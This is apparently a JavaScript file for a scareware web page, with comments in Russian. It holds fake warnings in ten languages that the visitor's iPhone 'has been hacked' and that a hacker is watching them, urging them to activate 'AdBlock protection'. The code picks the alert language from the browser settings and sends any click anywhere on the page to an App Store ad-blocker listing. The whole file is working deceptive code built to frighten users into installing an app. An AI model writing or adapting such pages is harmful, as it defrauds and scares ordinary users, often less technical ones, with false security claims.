
// Словарь переводов для 10 самых популярных языков
const translations = {
    en: {
        heading: "Your iPhone has been hacked!",
        description: "A hacker is monitoring all your activities. Immediate action is required! To protect your device, move the slider to activate AdBlock protection.",
        download: "Download AdBlock",
        cancel: "Cancel"
    },
    zh: {
        heading: "您的iPhone已被黑客入侵！",
        description: "黑客正在监视您的所有活动。 需要立即采取行动！ 为了保护您的设备，请移动滑块以激活AdBlock保护。",
        download: "下载AdBlock",
        cancel: "取消"
    },
    es: {
        heading: "¡Tu iPhone ha sido hackeado!",
        description: "Un hacker está monitoreando todas tus actividades. ¡Se requiere acción inmediata! Para proteger tu dispositivo, mueve el control deslizante para activar la protección de AdBlock.",
        download: "Descargar AdBlock",
        cancel: "Cancelar"
    },
    ar: {
        heading: "تم اختراق جهاز iPhone الخاص بك!",
        description: "هناك مخترق يتتبع جميع أنشطتك. الإجراء الفوري مطلوب! لحماية جهازك، حرك شريط التمرير لتفعيل حماية AdBlock.",
        download: "تحميل AdBlock",
        cancel: "إلغاء"
    },
    fr: {
        heading: "Votre iPhone a été piraté !",
        description: "Un hacker surveille toutes vos activités. Une action immédiate est requise ! Pour protéger votre appareil, déplacez le curseur pour activer la protection AdBlock.",
        download: "Télécharger AdBlock",
        cancel: "Annuler"
    },
    pt: {
        heading: "Seu iPhone foi hackeado!",
        description: "Um hacker está monitorando todas as suas atividades. Ação imediata é necessária! Para proteger seu dispositivo, mova o controle deslizante para ativar a proteção do AdBlock.",
        download: "Baixar AdBlock",
        cancel: "Cancelar"
    },
    de: {
        heading: "Ihr iPhone wurde gehackt!",
        description: "Ein Hacker überwacht alle Ihre Aktivitäten. Sofortiges Handeln ist erforderlich! Um Ihr Gerät zu schützen, bewegen Sie den Schieberegler, um den AdBlock-Schutz zu aktivieren.",
        download: "AdBlock herunterladen",
        cancel: "Abbrechen"
    },
    ja: {
        heading: "あなたのiPhoneはハッキングされました！",
        description: "ハッカーがあなたのすべての活動を監視しています。 直ちに行動が必要です！ デバイスを保護するには、スライダーを移動してAdBlock保護を有効にします。",
        download: "AdBlockをダウンロード",
        cancel: "キャンセル"
    },
    hi: {
        heading: "आपका iPhone हैक कर लिया गया है!",
        description: "एक हैकर आपकी सभी गतिविधियों की निगरानी कर रहा है। तुरंत कार्रवाई की आवश्यकता है! अपने डिवाइस की सुरक्षा के लिए, स्लाइडर को खींचकर AdBlock सुरक्षा सक्रिय करें।",
        download: "AdBlock डाउनलोड करें",
        cancel: "रद्द करें"
    },
    it: {
        heading: "Il tuo iPhone è stato hackerato!",
        description: "Un hacker sta monitorando tutte le tue attività. È richiesta un'azione immediata! Per proteggere il tuo dispositivo, sposta il cursore per attivare la protezione AdBlock.",
        download: "Scarica AdBlock",
        cancel: "Annulla"
    }
};

// Получаем язык системы пользователя
let userLang = navigator.language || navigator.userLanguage;
userLang = userLang.split('-')[0];

// Устанавливаем английский по умолчанию, если язык не поддерживается
if (!translations[userLang]) {
    userLang = 'en';
}

// Переводим страницу на основе языка пользователя
function translatePage() {
    document.querySelector('#main-title').textContent = translations[userLang].heading;
    document.querySelector('#description').textContent = translations[userLang].description;
    document.querySelector('.download-btn').textContent = translations[userLang].download;
    document.querySelector('.cancel-button').textContent = translations[userLang].cancel;
}

// Событие клика по всей странице
document.addEventListener('click', function() {
    window.location.href = "https://apps.apple.com/us/app/ad-blocker-browser-protect/id1585053145";
});

// Перевод страницы при загрузке
document.addEventListener('DOMContentLoaded', translatePage);
